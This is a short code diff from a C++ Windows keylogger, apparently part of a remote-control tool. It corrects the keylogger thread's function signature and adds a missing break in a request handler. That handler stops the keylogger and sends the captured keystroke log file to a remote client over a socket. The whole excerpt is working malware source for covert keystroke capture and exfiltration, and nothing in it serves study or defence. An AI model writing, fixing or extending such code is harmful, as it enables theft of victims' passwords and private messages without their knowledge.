@@ -14,7 +14,7 @@ DWORD Keylogger::dwThreadID = 0;
 std::atomic_bool Keylogger::isShiftPressed = false;
 std::atomic_bool Keylogger::isCapsLockOn = false;
 
-DWORD WINAPI Keylogger::SKeylogger() {
+DWORD WINAPI Keylogger::SKeylogger(LPVOID *) {
     if (isKeyloggerRunning) {
         return 1;
     }
@@ -457,9 +457,10 @@ void Keylogger::HandleRequest(SOCKET client_socket, const PacketHeader &header) 
             } else {
                 StopKeylogger();
                 Response response(header.request_id, 0x00); // Stopped successfully
-                File::SendFile(this->KEYLOG_FILENAME.c_str(), client_socket, header);
+                File::SendFile(KEYLOG_FILENAME.c_str(), client_socket, header);
                 response.sendResponse(client_socket);
             }
+            break;
         }
         case 0x03: {
             Response response(header.request_id, 0x04);
